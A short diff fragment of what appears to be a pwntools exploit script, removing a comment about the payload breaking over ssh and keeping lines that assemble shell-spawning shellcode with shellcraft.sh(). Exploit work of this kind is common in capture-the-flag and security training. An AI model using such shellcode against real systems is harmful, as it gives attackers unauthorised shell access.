@@ -1,4 +1,3 @@
-# must be run from the machine - over ssh mangles the payload somehow
 from pwn import *
 
 shellcode = asm(shellcraft.sh())
